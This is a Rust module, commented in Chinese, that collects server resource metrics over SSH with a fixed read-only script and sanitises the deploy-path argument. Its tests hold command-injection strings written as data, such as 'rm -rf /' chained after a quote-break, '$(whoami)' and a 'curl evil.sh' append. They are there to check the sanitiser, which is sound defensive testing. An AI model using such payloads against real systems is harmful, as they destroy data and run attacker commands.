//! 通过 SSH 采集服务器资源占用。
//!
//! 采集必须尽量少的往返：一次连接、一条命令、一次解析。命令本身是固定的
//! 只读脚本，不拼接任何用户输入，因此没有注入面。

use anyhow::{bail, Context, Result};
use ssh2::Session;
use std::io::Read;

use crate::models::{DeployTarget, ServerMetrics};

/// 单条只读采样脚本。
///
/// CPU 用 `/proc/stat` 的两次差值：第一次的总量是自开机以来的累计值，
/// 直接拿它算利用率得到的是「历史平均」而不是「当前」，所以先丢弃第一行。
/// 两次采样间隔 0.3s，足够短到不拖慢接口，又长到能读出有意义的变化。
const SAMPLE_SCRIPT: &str = r#"
LC_ALL=C
read_cpu() { awk '/^cpu /{print $2,$3,$4,$5,$6,$7,$8}' /proc/stat; }
c1=$(read_cpu); sleep 0.3; c2=$(read_cpu)
echo "$c1 $c2" | awk '{
  for (i = 1; i <= 7; i++) { a[i] = $i; b[i] = $(i+7) }
  idle = (b[4]-a[4]) + (b[5]-a[5])
  total = 0
  for (i = 1; i <= 7; i++) total += b[i]-a[i]
  if (total <= 0) { print "cpu=0" } else { printf "cpu=%.1f\n", (total-idle)*100/total }
}'
awk '/^MemTotal:/{t=$2} /^MemAvailable:/{a=$2} /^SwapTotal:/{st=$2} /^SwapFree:/{sf=$2}
     END { printf "mem_total=%d\nmem_avail=%d\nswap_total=%d\nswap_free=%d\n", t, a, st, sf }' /proc/meminfo
awk '{print "load="$1" "$2" "$3}' /proc/loadavg
echo "cores=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo)"
awk '{print "uptime="$1}' /proc/uptime
echo "os=$( ( . /etc/os-release 2>/dev/null && echo "$PRETTY_NAME" ) || uname -s )"
echo "kernel=$(uname -r)"
echo "mount=$SAMPLE_MOUNT"
df -P -k "$SAMPLE_MOUNT" 2>/dev/null | awk 'NR==2{print "disk_total="$2"\ndisk_used="$3}'
"#;

/// 采样结果，`None` 表示该项拿不到。
#[derive(Debug, Default)]
struct ParsedSample {
    cpu_percent: Option<f64>,
    load: Option<(f64, f64, f64)>,
    cores: Option<i64>,
    uptime_seconds: Option<i64>,
    mem_total_kb: Option<i64>,
    mem_avail_kb: Option<i64>,
    swap_total_kb: Option<i64>,
    swap_free_kb: Option<i64>,
    disk_total_kb: Option<i64>,
    disk_used_kb: Option<i64>,
    os: Option<String>,
    kernel: Option<String>,
    mount: Option<String>,
}

fn field<'a>(body: &'a str, key: &str) -> Option<&'a str> {
    body.lines()
        .find_map(|line| line.strip_prefix(key))
        .map(str::trim)
        .filter(|value| !value.is_empty())
}

fn parse_i64(body: &str, key: &str) -> Option<i64> {
    field(body, key).and_then(|value| value.parse::<i64>().ok())
}

/// `/proc/uptime` 是小数（`1597320.55`），整数解析会直接失败。
fn parse_seconds(body: &str, key: &str) -> Option<i64> {
    field(body, key).and_then(|value| value.parse::<f64>().ok()).map(|v| v as i64)
}

fn parse_f64(body: &str, key: &str) -> Option<f64> {
    field(body, key).and_then(|value| value.parse::<f64>().ok())
}

fn parse_sample(body: &str) -> ParsedSample {
    let mut out = ParsedSample {
        cpu_percent: parse_f64(body, "cpu="),
        cores: parse_i64(body, "cores="),
        uptime_seconds: parse_seconds(body, "uptime="),
        mem_total_kb: parse_i64(body, "mem_total="),
        mem_avail_kb: parse_i64(body, "mem_avail="),
        swap_total_kb: parse_i64(body, "swap_total="),
        swap_free_kb: parse_i64(body, "swap_free="),
        disk_total_kb: parse_i64(body, "disk_total="),
        disk_used_kb: parse_i64(body, "disk_used="),
        os: field(body, "os=").map(str::to_string),
        kernel: field(body, "kernel=").map(str::to_string),
        mount: field(body, "mount=").map(str::to_string),
        ..Default::default()
    };

    if let Some(load) = field(body, "load=") {
        let parts: Vec<f64> = load
            .split_whitespace()
            .filter_map(|value| value.parse::<f64>().ok())
            .collect();
        if parts.len() >= 3 {
            out.load = Some((parts[0], parts[1], parts[2]));
        }
    }

    out
}

/// 内存占用按 `MemTotal - MemAvailable` 计算。
///
/// 不用 `MemFree`：Linux 会把空闲内存大量用作 page cache，`MemFree` 常年很低，
/// 拿它算占用率会得出「内存快满了」的错误结论。`MemAvailable` 才是内核给出的
/// 「还能给新进程用多少」的估算。
fn memory_used_kb(total: i64, available: i64) -> i64 {
    (total - available).max(0)
}

pub fn percent(used: i64, total: i64) -> Option<f64> {
    if total <= 0 {
        return None;
    }
    Some((used as f64) * 100.0 / (total as f64))
}

/// 采样命令里替换部署目录，避免 shell 里再拼一次引号。
///
/// 字符白名单刻意不含引号：结果会被单引号包裹，若允许 `'` 进入就能闭合引号
/// 并追加任意命令，等于把服务器配置变成命令注入点。
fn build_script(mount: &str) -> String {
    let safe: String = mount
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '_' | '-'))
        .collect();
    let mount = if safe.is_empty() || safe == "/" {
        "/".to_string()
    } else {
        safe.trim_end_matches('/').to_string()
    };
    SAMPLE_SCRIPT.replace("$SAMPLE_MOUNT", &format!("'{}'", mount))
}

fn run_sample(session: &Session, script: &str) -> Result<String> {
    let mut channel = session
        .channel_session()
        .context("open ssh channel failed")?;
    channel.exec(script).context("exec sample script failed")?;

    let mut stdout = String::new();
    channel
        .read_to_string(&mut stdout)
        .context("read sample stdout failed")?;
    let mut stderr = String::new();
    channel
        .stderr()
        .read_to_string(&mut stderr)
        .context("read sample stderr failed")?;
    channel.wait_close().context("wait sample close failed")?;

    if !session.authenticated() {
        bail!("ssh session dropped during sampling");
    }

    // 采样脚本个别段落失败（例如没有 df 权限）不应该让整次采样失败，
    // 只要还能解析出字段就继续，缺失项留 None。
    if stdout.trim().is_empty() {
        bail!(
            "采样没有输出{}",
            if stderr.trim().is_empty() {
                String::new()
            } else {
                format!(": {}", stderr.trim())
            }
        );
    }

    Ok(stdout)
}

pub fn sample_server(target: &DeployTarget) -> ServerMetrics {
    let mut metrics = ServerMetrics {
        server_id: target.server_id,
        sampled_at: crate::utils::now_ts(),
        ..Default::default()
    };

    let mut log = String::new();
    let session = match crate::deploy::connect_target(target, &mut log) {
        Ok(session) => session,
        Err(err) => {
            metrics.error = Some(format!("{}: {err:#}", target.name));
            return metrics;
        }
    };

    let script = build_script(target_mount(target));
    let body = match run_sample(&session, &script) {
        Ok(body) => body,
        Err(err) => {
            metrics.error = Some(format!("{}: {err:#}", target.name));
            return metrics;
        }
    };

    metrics.reachable = true;
    let parsed = parse_sample(&body);

    metrics.cpu_percent = parsed.cpu_percent;
    metrics.cpu_cores = parsed.cores;
    metrics.uptime_seconds = parsed.uptime_seconds;
    metrics.os = parsed.os;
    metrics.kernel = parsed.kernel;
    metrics.disk_mount = parsed.mount;
    if let Some((l1, l5, l15)) = parsed.load {
        metrics.load1 = Some(l1);
        metrics.load5 = Some(l5);
        metrics.load15 = Some(l15);
    }

    if let (Some(total), Some(avail)) = (parsed.mem_total_kb, parsed.mem_avail_kb) {
        let used = memory_used_kb(total, avail);
        metrics.mem_total_kb = Some(total);
        metrics.mem_used_kb = Some(used);
        metrics.mem_percent = percent(used, total);
    }
    if let (Some(total), Some(free)) = (parsed.swap_total_kb, parsed.swap_free_kb) {
        metrics.swap_total_kb = Some(total);
        metrics.swap_used_kb = Some((total - free).max(0));
    }

    if let (Some(total), Some(used)) = (parsed.disk_total_kb, parsed.disk_used_kb) {
        metrics.disk_total_kb = Some(total);
        metrics.disk_used_kb = Some(used);
        metrics.disk_percent = percent(used, total);
    }

    metrics
}

/// 优先看部署目录所在分区，那里才是真正会被写满的地方。
fn target_mount(target: &DeployTarget) -> &str {
    target.deploy_path.as_deref().unwrap_or("/")
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = "cpu=23.4\nmem_total=8192000\nmem_avail=3211264\nswap_total=2097152\nswap_free=2097152\nload=0.42 0.31 0.28\ncores=4\nuptime=1597320.55\nos=Ubuntu 24.04.1 LTS\nkernel=6.8.0-45-generic\nmount=/srv/apps/keel\ndisk_total=167772160\ndisk_used=123731968\n";

    /// 从生成的脚本里取回实际的 mount 字面量（含外层单引号）。
    fn mount_literal(script: &str) -> String {
        script
            .lines()
            .find_map(|l| l.strip_prefix("echo \"mount="))
            .and_then(|l| l.strip_suffix('"'))
            .expect("mount line present")
            .to_string()
    }

    #[test]
    fn parses_every_field() {
        let p = parse_sample(SAMPLE);
        assert_eq!(p.cpu_percent, Some(23.4));
        assert_eq!(p.cores, Some(4));
        assert_eq!(p.uptime_seconds, Some(1_597_320));
        assert_eq!(p.mem_total_kb, Some(8_192_000));
        assert_eq!(p.mem_avail_kb, Some(3_211_264));
        assert_eq!(p.disk_total_kb, Some(167_772_160));
        assert_eq!(p.disk_used_kb, Some(123_731_968));
        assert_eq!(p.os.as_deref(), Some("Ubuntu 24.04.1 LTS"));
        assert_eq!(p.kernel.as_deref(), Some("6.8.0-45-generic"));
        assert_eq!(p.mount.as_deref(), Some("/srv/apps/keel"));
        assert_eq!(p.load, Some((0.42, 0.31, 0.28)));
    }

    #[test]
    fn missing_fields_stay_none_instead_of_panicking() {
        let p = parse_sample("cpu=0\nload=0.10 0.20 0.30\n");
        assert_eq!(p.mem_total_kb, None);
        assert_eq!(p.disk_total_kb, None);
        assert_eq!(p.os, None);
        assert_eq!(p.cores, None);
        // 有 load 但不完整时不应写半个值进去
        let p2 = parse_sample("load=0.10 0.20\n");
        assert_eq!(p2.load, None);
    }

    #[test]
    fn memory_uses_available_not_free() {
        // 8GiB 总量、只剩 3.2GiB 可用时，占用应按 8-3.2=4.8GiB 算，
        // 而不是按 MemFree 算成 90%+（page cache 会让 MemFree 常年很低）
        let used = memory_used_kb(8_192_000, 3_211_264);
        assert_eq!(used, 4_980_736);
        let pct = percent(used, 8_192_000).unwrap();
        assert!((pct - 60.8).abs() < 0.2, "got {pct}");
    }

    #[test]
    fn percent_guards_against_zero_total() {
        assert_eq!(percent(0, 0), None);
        assert_eq!(percent(10, 0), None);
        assert_eq!(percent(0, 100), Some(0.0));
        assert_eq!(percent(50, 100), Some(50.0));
    }

    #[test]
    fn script_substitutes_mount() {
        let script = build_script("/srv/apps/keel");
        assert_eq!(mount_literal(&script), "'/srv/apps/keel'");
        assert!(!script.contains("$SAMPLE_MOUNT"));
    }

    #[test]
    fn script_quotes_mount_and_strips_metacharacters() {
        // 单引号必须被滤掉，否则可以闭合引号再接任意命令
        for evil in [
            "/tmp'; rm -rf /; echo '",
            "/tmp; rm -rf /",
            "$(whoami)",
            "`id`",
            "/tmp && curl evil.sh",
            "/tmp\nrm -rf /",
        ] {
            let literal = mount_literal(&build_script(evil));
            assert!(literal.starts_with('\''), "not quoted: {literal}");
            assert!(literal.ends_with('\''), "not quoted: {literal}");
            let inner = &literal[1..literal.len() - 1];
            for banned in ['\'', ';', ' ', '$', '`', '&', '\n', '|', '>', '<'] {
                assert!(
                    !inner.contains(banned),
                    "dangerous char {banned:?} survived in {literal:?} (from {evil:?})"
                );
            }
        }
    }

    #[test]
    fn script_keeps_legitimate_paths_intact() {
        for path in ["/", "/srv/apps/keel", "/var/www/site-1.2", "/home/deploy_a/b"] {
            let script = build_script(path);
            assert_eq!(
                mount_literal(&script),
                format!("'{path}'"),
                "path mangled: {path}"
            );
        }
    }

    #[test]
    fn empty_or_trailing_slash_mount_falls_back_to_root() {
        assert_eq!(mount_literal(&build_script("")), "'/'");
        assert_eq!(mount_literal(&build_script("   ")), "'/'");
        assert_eq!(mount_literal(&build_script("!!!")), "'/'");
        assert_eq!(mount_literal(&build_script("/srv/apps/")), "'/srv/apps'");
    }
}
